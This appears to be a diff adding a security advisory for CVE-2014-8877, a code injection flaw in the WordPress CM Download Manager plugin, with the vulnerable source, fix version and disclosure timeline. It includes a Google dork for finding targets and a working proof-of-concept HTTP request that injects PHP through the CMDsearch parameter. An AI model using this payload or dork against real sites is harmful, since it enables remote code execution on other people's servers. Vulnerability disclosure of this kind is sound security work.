@@ -1,0 +1,78 @@
+# Vulnerability title: Code Injection in Wordpress CM Download Manager plugin 2.0.0
+# CVE: CVE-2014-8877 
+# Plugin: CM Download Manager plugin
+# Vendor: CreativeMinds - https://www.cminds.com/
+# Link download: https://wordpress.org/plugins/cm-download-manager/
+# Affected version: 2.0.0 and previous version
+# Fixed version: 2.0.4
+# Google dork: inurl:cmdownloads
+# Reported by: Le Ngoc Phi - phi.n.le (at) itas (dot) vn [email concealed]
+# Credits to ITAS Team - www.itas.vn
+
+::DESCRITION::
+
+The code injection vulnerability has been found and confirmed within the software as an anonymous user. A successful attack could allow an anonymous attacker gains full control of the application and the ability to use any operating system functions that are available to the scripting environment.
+
+GET /cmdownloads/?CMDsearch=".phpinfo()." HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: _ga=GA1.2.1698795018.1415614778; _gat=1; PHPSESSID=okt6c51s4esif2qjq451ati7m6; cmdm_disclaimer=Y; JSB=1415614988879 
+Connection: keep-alive
+
+Vulnerable file:/wp-content/plugins/cm-download-manager/lib/controllers/CmdownloadC
+ontroller.php
+Vulnerable code: (Line: 130 -> 158)
+
+public static function alterSearchQuery($search, $query)
+{
+if( ( (isset($query->query_vars['post_type']) && $query->query_vars['post_type'] == CMDM_GroupDownloadPage::POST_TYPE) && (!isset($query->query_vars['widget']) || $query->query_vars['widget'] !== true) ) && !$query->is_single && !$query->is_404 && !$query->is_author && isset($_GET['CMDsearch']) )
+{
+global $wpdb;
+$search_term = $_GET['CMDsearch'];
+if( !empty($search_term) )
+{
+$search = '';
+$query->is_search = true;
+// added slashes screw with quote grouping when done early, so done later
+$search_term = stripslashes($search_term);
+preg_match_all('/".*?("|$)|((?<=[\r\n\t ",+])|^)[^\r\n\t ",+]+/', $search_term, $matches);
+$terms = array_map('_search_terms_tidy', $matches[0]);
+
+$n = '%';
+$searchand = ' AND ';
+foreach((array) $terms as $term)
+{
+$term = esc_sql(like_escape($term));
+$search .= "{$searchand}(($wpdb->posts.post_title LIKE '{$n}{$term}{$n}') OR ($wpdb->posts.post_content LIKE '{$n}{$term}{$n}'))";
+}
+add_filter('get_search_query', create_function('$q', 'return "' . $search_term . '";'), 99, 1);
+remove_filter('posts_request', 'relevanssi_prevent_default_request');
+remove_filter('the_posts', 'relevanssi_query');
+}
+}
+return $search;
+}
+
+::SOLUTION::
+Update to version 2.0.4
+
+::DISCLOSURE::
+2014-11-08 initial vendor contact
+2014-11-10 vendor response
+2014-11-10 vendor confirmed 
+2014-11-11 vendor release patch
+2014-11-14 public disclosure
+
+::REFERENCE::
+https://downloadsmanager.cminds.com/release-notes/
+http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.
+html?language=en
+
+::COPYRIGHT::
+Copyright (c) ITAS CORP 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of ITAS CORP.
+
+::DISCLAIMER::
+THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK.
